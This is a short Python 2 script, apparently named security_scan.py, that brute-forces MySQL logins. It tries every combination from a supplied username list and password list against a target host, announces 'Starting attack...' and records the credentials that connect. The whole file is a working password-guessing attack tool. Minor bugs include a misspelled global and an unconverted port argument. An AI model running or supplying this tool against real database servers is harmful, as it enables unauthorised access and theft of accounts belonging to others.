#!/usr/bin/python
# -*- coding:utf-8 -*-
import sys,getopt
import thread
from progressive.bar import Bar
opts,args = getopt.getopt(sys.argv[1:], "h::p:u:w:")
#print opts,args
host = '127.0.0.1'  #数据库主机
port = 3306       #服务器端口 默认3307
user_name_flie = None   #用户名列表
pass_file = None   #密码列表

if len(opts) == 0:
    print 'Usage: python security_scan.py [-h hostname] [-p port] -u user.list.flie  -w password.list.file'
    sys.exit()
for op, value in opts:
    if op == '-h':
        host = value
    elif op == '-p':
        port = value
    elif op == '-u':
        user_name_flie = value
    elif op == '-w':
        pass_file = value

if user_name_flie == None:
    print 'No userlist was specified!'
    sys.exit()
if pass_file == None:
    print 'No pass list was specified!'
    sys.exit()

with open(user_name_flie, 'r') as up:
    global user_name_list
    user_name_list = up.read().split('\n')
    # print user_name_list

with open(pass_file, 'r') as wp:
    global pass_list
    pass_list = wp.read().split('\n')
   # print pass_list


def start_attack():
    import MySQLdb
    global avalible_pass

    print 'Starting attack...'
    bar = Bar(max_value= len(user_name_list)*len(pass_list))
    bar.cursor.clear_lines(2)
    bar.cursor.save()
    i = 0

    for user_name in user_name_list:
        for password in pass_list:
            try:
                access = MySQLdb.connect(host=host, port=port, user=user_name, passwd=password)
                database_access = access.cursor()
                print 'username:',user_name, " password:", password
                available_pass.append((user_name,password))
            except Exception, exception:
                if 'Access denied for user' in str(exception):
                    print 'Access denied'
                else:
                    print str(exception)
            finally:
                i += 1
                bar.cursor.restore()
                bar.draw(i)

if __name__ == '__main__':
    available_pass = list()
    start_attack()
    print "Available pass:", available_pass
